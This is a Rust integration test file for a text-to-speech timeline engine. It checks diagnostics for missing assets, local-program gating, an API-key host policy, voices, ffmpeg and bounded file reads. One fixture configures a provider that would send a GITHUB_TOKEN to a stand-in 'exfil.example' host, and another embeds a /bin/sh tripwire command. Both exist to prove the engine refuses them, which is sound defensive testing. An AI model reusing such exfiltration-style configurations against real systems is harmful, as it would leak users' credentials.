//! Environment checks: what validate (and plan and render) find out about this machine without calling a
//! provider: assets of documents with errors, local programs, the key-sending host policy, command
//! templates, local servers, installed voices, ffmpeg for a requested format, and bounded timeline reads.

mod common;

use std::time::{Duration, Instant};

use common::*;
use soniccraft_core::{Diagnostic, SourceFormat};
use soniccraft_engine::{
    Engine, EngineOptions, RenderOverrides, Severity, TimelineSource, ValidateOptions,
    ValidationReport,
};

fn find<'a>(report: &'a [Diagnostic], code: &str) -> &'a Diagnostic {
    report
        .iter()
        .find(|d| d.code == code)
        .unwrap_or_else(|| panic!("no `{code}` in {report:#?}"))
}

async fn validate(engine: &Engine, source: &TimelineSource) -> ValidationReport {
    engine.validate(source, &ValidateOptions::default()).await
}

/// The files a document names are checked even when the document has errors.
#[tokio::test(flavor = "multi_thread")]
async fn assets_are_checked_in_documents_with_errors() {
    let project = Project::new();
    let text = r#"version: "1.0"
tracks:
  - id: voice
    type: speech
    sequence:
      - { txt: "Hello.", provider: mock }
  - id: fx
    type: sfx
    clips:
      - { id: lost, source: assets/sfx/whosh.wav }
"#;
    let source = project.timeline("broken.yaml", text);
    let engine = project.engine();
    let report = validate(&engine, &source).await;
    assert!(!report.valid && report.summary.is_none());
    find(&report.diagnostics, "unknown_field");
    let d = find(&report.diagnostics, "asset_not_found");
    assert_eq!(d.path.as_deref(), Some("tracks[1].clips[0].source"));
    assert_eq!(d.related, ["lost"]);
    assert!(d.line.is_some(), "{d:?}");
    assert_eq!(
        d.hint.as_deref(),
        Some("Did you mean `assets/sfx/whoosh.wav`?")
    );
    let plan = engine.plan(&source).await;
    find(&plan.diagnostics, "asset_not_found");
    let failure = engine
        .render(&source, &RenderOverrides::default())
        .await
        .unwrap_err();
    find(&failure.diagnostics, "asset_not_found");
}

fn tripwire(marker: &std::path::Path) -> String {
    format!(
        r#"version: "1.0"
providers:
  cmd:
    type: command
    command: ["/bin/sh", "-c", "echo ran >> \"$0\"", "{}"]
tracks:
  - id: voice
    type: speech
    sequence:
      - {{ text: "A local program would speak this.", provider: cmd, voice_id: any }}
"#,
        marker.display()
    )
}

fn no_command(project: &Project) -> Engine {
    Engine::new(EngineOptions {
        cache_dir: Some(project.cache_dir()),
        allow_command: false,
        ..EngineOptions::default()
    })
    .with_env(hermetic_env(&[]))
}

/// Without `allow_command`, `command` providers (and piper with a custom `command`) are refused in validate
/// and render, and the program never runs.
#[tokio::test(flavor = "multi_thread")]
async fn local_programs_need_allow_command() {
    let project = Project::new();
    let marker = project.join("ran.txt");
    let source = project.timeline("cmd.yaml", &tripwire(&marker));
    let engine = no_command(&project);
    let report = validate(&engine, &source).await;
    assert!(!report.valid);
    let d = find(&report.diagnostics, "provider_unavailable");
    assert_eq!(
        (d.severity, d.path.as_deref()),
        (Severity::Error, Some("providers.cmd.command"))
    );
    assert!(d.message.contains("/bin/sh"), "{}", d.message);
    assert_eq!(
        d.hint.as_deref(),
        Some(
            "start the MCP server with --allow-command (or SONICCRAFT_ALLOW_COMMAND=1) to let timelines run \
             local programs"
        )
    );
    assert_eq!(
        report
            .diagnostics
            .iter()
            .filter(|d| d.code == "provider_unavailable")
            .count(),
        1
    );
    let failure = engine
        .render(&source, &RenderOverrides::default())
        .await
        .unwrap_err();
    find(&failure.diagnostics, "provider_unavailable");
    assert!(!marker.exists(), "the program ran");

    // Piper with its own program is a local program too.
    let piper = r#"version: "1.0"
providers:
  pp:
    type: piper
    command: ["/bin/echo", "{voice_id}"]
tracks:
  - id: voice
    type: speech
    sequence:
      - { text: "Piper.", provider: pp, voice_id: voices/model.onnx }
"#;
    let report = validate(&engine, &project.timeline("piper.yaml", piper)).await;
    let d = find(&report.diagnostics, "provider_unavailable");
    assert_eq!(d.path.as_deref(), Some("providers.pp.command"));
    assert!(
        d.message.contains("custom program `/bin/echo`"),
        "{}",
        d.message
    );

    // The provider report agrees.
    let command = engine
        .providers()
        .providers
        .into_iter()
        .find(|p| p.name == "command")
        .unwrap();
    assert!(!command.available && command.status.contains("--allow-command"));
    // Allowed, the same timeline validates.
    assert!(validate(&project.engine(), &source).await.valid);
}

/// A key the timeline would send to a host the key policy refuses is one `provider_unavailable` error with
/// the policy's own hint.
#[tokio::test(flavor = "multi_thread")]
async fn keys_go_only_to_allowed_hosts() {
    let project = Project::new();
    let text = r#"version: "1.0"
providers:
  leak:
    type: openai
    base_url: https://exfil.example/v1
    api_key_env: GITHUB_TOKEN
tracks:
  - id: voice
    type: speech
    sequence:
      - { text: "Hi.", provider: leak, voice_id: alloy }
"#;
    let engine = Engine::new(EngineOptions {
        cache_dir: Some(project.cache_dir()),
        ..EngineOptions::default()
    })
    .with_env(hermetic_env(&[("GITHUB_TOKEN", "ghp_secret")]));
    let report = validate(&engine, &project.timeline("leak.yaml", text)).await;
    let refused: Vec<&Diagnostic> = report
        .diagnostics
        .iter()
        .filter(|d| d.code == "provider_unavailable")
        .collect();
    assert_eq!(refused.len(), 1, "{:#?}", report.diagnostics);
    let d = refused[0];
    assert_eq!(
        (d.severity, d.path.as_deref()),
        (Severity::Error, Some("providers.leak"))
    );
    assert!(d.message.contains("exfil.example"), "{}", d.message);
    assert!(
        d.hint
            .as_deref()
            .unwrap()
            .contains("SONICCRAFT_ALLOWED_HOSTS"),
        "{d:?}"
    );
    assert!(!format!("{report:?}").contains("ghp_secret"));
}

/// `{text}` as an argument of its own is a warning with the template fix.
#[tokio::test(flavor = "multi_thread")]
async fn standalone_text_arguments_are_flagged() {
    let project = Project::new();
    let text = r#"version: "1.0"
providers:
  cmd:
    type: command
    command: ["/bin/echo", "{text}", "{output}"]
tracks:
  - id: voice
    type: speech
    sequence:
      - { text: "Hi.", provider: cmd, voice_id: any }
"#;
    let report = validate(&project.engine(), &project.timeline("cmd.yaml", text)).await;
    let d = find(&report.diagnostics, "suspicious_value");
    assert_eq!(
        (d.severity, d.path.as_deref()),
        (Severity::Warning, Some("providers.cmd.command[1]"))
    );
    assert!(d.hint.as_deref().unwrap().contains("{text_file}"), "{d:?}");
}

/// A local server that does not answer is reported by validate (quickly) and by the provider report.
#[tokio::test(flavor = "multi_thread")]
async fn unreachable_local_servers_are_reported() {
    let project = Project::new();
    let kokoro = |url: &str| {
        format!(
            r#"version: "1.0"
providers:
  kokoro:
    base_url: {url}
tracks:
  - id: voice
    type: speech
    sequence:
      - {{ text: "Hi.", provider: kokoro }}
"#
        )
    };
    let engine = project.engine();
    // Port 1 on loopback: nothing listens there.
    let started = Instant::now();
    let report = validate(
        &engine,
        &project.timeline("down.yaml", &kokoro("http://127.0.0.1:1")),
    )
    .await;
    assert!(started.elapsed() < Duration::from_secs(3));
    assert!(!report.valid);
    let d = find(&report.diagnostics, "provider_unavailable");
    assert_eq!(
        d.message,
        "no Kokoro-FastAPI server answered at http://127.0.0.1:1; 1 of 1 cues are not cached"
    );
    assert_eq!(d.path.as_deref(), Some("providers.kokoro"));
    assert!(d.hint.as_deref().unwrap().contains("docker run"), "{d:?}");
    // Something listening: no complaint.
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());
    let report = validate(&engine, &project.timeline("up.yaml", &kokoro(&url))).await;
    assert!(
        report
            .diagnostics
            .iter()
            .all(|d| d.code != "provider_unavailable"),
        "{:#?}",
        report.diagnostics
    );

    let report = |base: &str| {
        Engine::new(EngineOptions::default())
            .with_env(hermetic_env(&[("KOKORO_BASE_URL", base)]))
            .providers()
            .providers
            .into_iter()
            .find(|p| p.name == "kokoro")
            .unwrap()
    };
    let down = report("http://127.0.0.1:1");
    assert!(!down.available);
    assert_eq!(
        down.status,
        "no Kokoro-FastAPI server answered at http://127.0.0.1:1"
    );
    let up = report(&url);
    assert!(up.available);
    assert_eq!(
        up.status,
        format!("ready (a Kokoro-FastAPI server answers at {url}; no key needed)")
    );
    // URL credentials never show.
    let with_password = url.replace("http://", "http://user:secret@");
    assert!(!report(&with_password).status.contains("secret"));
}

/// A format requested as a render option that needs a missing ffmpeg says so, with no document path and
/// alternatives this build can write.
#[tokio::test(flavor = "multi_thread")]
async fn missing_ffmpeg_for_a_requested_format() {
    let project = Project::new();
    let source = project.timeline("briefing.yaml", README);
    let engine = Engine::new(EngineOptions {
        cache_dir: Some(project.cache_dir()),
        ffmpeg_path: Some(project.join("no-such-ffmpeg")),
        ..EngineOptions::default()
    })
    .with_env(hermetic_env(&[]));
    assert!(
        validate(&engine, &source).await.valid,
        "the timeline itself is fine"
    );
    let failure = engine
        .render(
            &source,
            &RenderOverrides {
                output_path: Some(project.join("x.opus")),
                format: Some("opus".into()),
                ..RenderOverrides::default()
            },
        )
        .await
        .unwrap_err();
    let d = find(&failure.diagnostics, "format_requires_ffmpeg");
    assert!(d.path.is_none() && d.line.is_none(), "{d:?}");
    assert!(
        d.message.contains("requested output format `opus`"),
        "{}",
        d.message
    );
    let hint = d.hint.as_deref().unwrap();
    assert!(!hint.contains("format: "), "{hint}");
    assert!(hint.contains("`wav`") && hint.contains("`flac`"), "{hint}");
    assert_eq!(hint.contains("`mp3`"), cfg!(feature = "mp3"), "{hint}");
    assert!(
        failure.message.starts_with("render stopped"),
        "{}",
        failure.message
    );
    // The format option is lenient about case.
    let report = engine
        .render(
            &source,
            &RenderOverrides {
                output_path: Some(project.join("y.flac")),
                format: Some("FLAC".into()),
                ..RenderOverrides::default()
            },
        )
        .await
        .unwrap();
    assert_eq!(report.output.format, "flac");
}

/// Voices that do not exist here are `unknown_voice`: a missing piper model (with the download hint), and on
/// macOS an uninstalled `say` voice (with a did-you-mean).
#[tokio::test(flavor = "multi_thread")]
async fn voices_that_are_not_installed() {
    let project = Project::new();
    let piper = r#"version: "1.0"
providers:
  pp:
    type: piper
    voices_dir: voices
tracks:
  - id: voice
    type: speech
    voice_id: en_US-nobody-medium
    sequence:
      - { text: "One.", provider: pp }
      - { text: "Two.", provider: pp }
"#;
    let report = validate(&project.engine(), &project.timeline("piper.yaml", piper)).await;
    let missing: Vec<&Diagnostic> = report
        .diagnostics
        .iter()
        .filter(|d| d.code == "unknown_voice")
        .collect();
    assert_eq!(
        missing.len(),
        1,
        "one per voice and place: {:#?}",
        report.diagnostics
    );
    let d = missing[0];
    assert_eq!(
        (d.severity, d.path.as_deref()),
        (Severity::Error, Some("tracks[0].voice_id"))
    );
    assert_eq!(d.related.len(), 2);
    assert!(d.message.contains("en_US-nobody-medium"), "{}", d.message);
    assert!(
        d.hint.as_deref().unwrap().contains("piper.download_voices"),
        "{d:?}"
    );

    #[cfg(target_os = "macos")]
    {
        if soniccraft_tts::resolve_macos_voice("Samantha").is_some_and(|r| r.is_ok()) {
            let say = r#"version: "1.0"
tracks:
  - id: voice
    type: speech
    sequence:
      - { text: "Hello.", provider: macos_say, voice_id: Samanthaa }
"#;
            let report = validate(&project.engine(), &project.timeline("say.yaml", say)).await;
            let d = find(&report.diagnostics, "unknown_voice");
            assert_eq!(d.path.as_deref(), Some("tracks[0].sequence[0].voice_id"));
            assert!(
                d.message.contains("`Samanthaa` is not installed"),
                "{}",
                d.message
            );
            assert!(
                d.hint
                    .as_deref()
                    .unwrap()
                    .starts_with("Did you mean `Samantha`?"),
                "{d:?}"
            );
            assert!(
                d.hint
                    .as_deref()
                    .unwrap()
                    .contains("soniccraft voices macos_say")
            );
        } else {
            eprintln!("skipping the macOS part: Samantha is not installed");
        }
    }
}

/// Timeline files are read with a bound: devices, FIFOs and huge files fail at once.
#[test]
fn timeline_files_are_read_with_a_bound() {
    use std::io::ErrorKind;
    let tmp = tempfile::tempdir().unwrap();
    let dir_err = TimelineSource::from_path(tmp.path()).unwrap_err();
    assert_eq!(dir_err.kind(), ErrorKind::IsADirectory);
    let big = tmp.path().join("big.yaml");
    std::fs::write(&big, vec![b'#'; soniccraft_engine::MAX_TIMELINE_BYTES + 1]).unwrap();
    let err = TimelineSource::from_path(&big).unwrap_err();
    assert_eq!(err.kind(), ErrorKind::FileTooLarge);
    assert!(err.to_string().contains("at most 5 MB"), "{err}");
    let fine = tmp.path().join("ok.yaml");
    std::fs::write(&fine, "version: \"1.0\"\n").unwrap();
    let source = TimelineSource::from_path(&fine).unwrap();
    assert_eq!(source.format, SourceFormat::Yaml);
    let latin1 = tmp.path().join("latin1.yaml");
    std::fs::write(&latin1, b"title: caf\xe9\n").unwrap();
    assert_eq!(
        TimelineSource::from_path(&latin1).unwrap_err().kind(),
        ErrorKind::InvalidData
    );
    // Readers (stdin) are bounded too.
    let huge = std::io::repeat(b' ').take_bytes();
    let err = TimelineSource::from_reader(huge, tmp.path(), SourceFormat::Auto).unwrap_err();
    assert_eq!(err.kind(), ErrorKind::FileTooLarge);
    let ok = TimelineSource::from_reader(&b"version: \"1.0\""[..], tmp.path(), SourceFormat::Auto)
        .unwrap();
    assert_eq!(ok.text, "version: \"1.0\"");
    #[cfg(unix)]
    {
        let started = Instant::now();
        let err = TimelineSource::from_path(std::path::Path::new("/dev/zero")).unwrap_err();
        assert_eq!(err.kind(), ErrorKind::InvalidInput);
        assert!(err.to_string().contains("a device"), "{err}");
        let fifo = tmp.path().join("pipe.yaml");
        let made = std::process::Command::new("mkfifo").arg(&fifo).status();
        if made.is_ok_and(|s| s.success()) {
            let err = TimelineSource::from_path(&fifo).unwrap_err();
            assert_eq!(err.kind(), ErrorKind::InvalidInput);
            assert!(err.to_string().contains("a FIFO"), "{err}");
        }
        assert!(started.elapsed() < Duration::from_secs(2));
    }
}

/// `std::io::repeat` made finite only by the reader's bound.
trait TakeBytes {
    fn take_bytes(self) -> std::io::Take<std::io::Repeat>;
}

impl TakeBytes for std::io::Repeat {
    fn take_bytes(self) -> std::io::Take<std::io::Repeat> {
        use std::io::Read;
        // 1 GiB: far more than the bound; reading it all would take seconds.
        self.take(1 << 30)
    }
}
